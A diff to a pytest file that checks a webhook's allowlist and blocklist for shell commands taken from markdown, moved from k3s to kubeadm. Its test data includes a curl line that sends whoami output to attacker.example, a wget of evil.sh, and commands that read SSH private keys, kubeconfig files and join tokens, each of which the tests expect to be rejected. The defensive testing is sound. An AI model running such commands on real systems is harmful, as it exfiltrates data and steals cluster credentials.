@@ -24,30 +24,35 @@ class TestParseCommandsAllowlist:
         ]
 
     def test_allows_sudo_prefix(self):
-        text = "```bash\nsudo k3s crictl rmi --prune\n```"
-        assert webhook.parse_commands(text) == ["sudo k3s crictl rmi --prune"]
+        text = "```bash\nsudo kubectl get nodes\n```"
+        assert webhook.parse_commands(text) == ["sudo kubectl get nodes"]
 
     @pytest.mark.parametrize("cmd", [
-        "ssh labadmin@192.168.122.219 sudo systemctl restart k3s-agent",
-        "virsh start k3s-worker-2",
-        "docker build -t 192.168.122.218:30500/pylab:latest /home/labadmin/pylab/",
+        "ssh labadmin@192.168.122.241 sudo systemctl restart kubelet",
+        "virsh start kubeadm-worker-2",
+        "docker build -t 192.168.122.240:30500/pylab:latest /home/labadmin/pylab/",
     ])
     def test_allows_other_operators(self, cmd):
         assert webhook.parse_commands(f"```bash\n{cmd}\n```") == [cmd]
 
     def test_rejects_commands_outside_allowlist(self):
-        text = "```bash\ncurl http://attacker.example/$(whoami)\nwget evil.sh\n```"
+        text = "```bash\ncurl http://attacker.example/$(whoami)\nwget evil.sh\nk3s kubectl get nodes\n```"
         assert webhook.parse_commands(text) == []
 
 
 class TestParseCommandsBlocklist:
     def test_blocks_reading_private_keys(self):
-        text = "```bash\nssh labadmin@192.168.122.219 cat ~/.ssh/id_rsa\n```"
+        text = "```bash\nssh labadmin@192.168.122.241 cat ~/.ssh/id_rsa\n```"
         assert webhook.parse_commands(text) == []
 
-    def test_blocks_node_token_read(self):
-        text = "```bash\nssh labadmin@192.168.122.218 sudo cat /var/lib/rancher/k3s/server/node-token\n```"
-        assert webhook.parse_commands(text) == []
+    @pytest.mark.parametrize("line", [
+        "ssh labadmin@192.168.122.240 sudo kubeadm token create --print-join-command",
+        "ssh labadmin@192.168.122.240 sudo cat /etc/kubernetes/admin.conf",
+        "ssh labadmin@192.168.122.241 sudo cat /etc/kubernetes/kubelet.conf",
+        "kubectl get secret -n kube-system bootstrap-token-abcdef",
+    ])
+    def test_blocks_join_token_and_kubeconfig_reads(self, line):
+        assert webhook.parse_commands(f"```bash\n{line}\n```") == []
 
     def test_blocks_kubectl_get_secret(self):
         text = "```bash\nkubectl get secret -n default\n```"
@@ -80,13 +85,13 @@ class TestParseCommandsFormatting:
     def test_skips_comments_and_blank_lines(self):
         text = (
             "```bash\n"
-            "# restart the agent\n"
+            "# restart the kubelet\n"
             "\n"
-            "ssh labadmin@192.168.122.219 sudo systemctl restart k3s-agent\n"
+            "ssh labadmin@192.168.122.241 sudo systemctl restart kubelet\n"
             "```"
         )
         assert webhook.parse_commands(text) == [
-            "ssh labadmin@192.168.122.219 sudo systemctl restart k3s-agent"
+            "ssh labadmin@192.168.122.241 sudo systemctl restart kubelet"
         ]
 
     def test_collects_from_multiple_code_blocks(self):
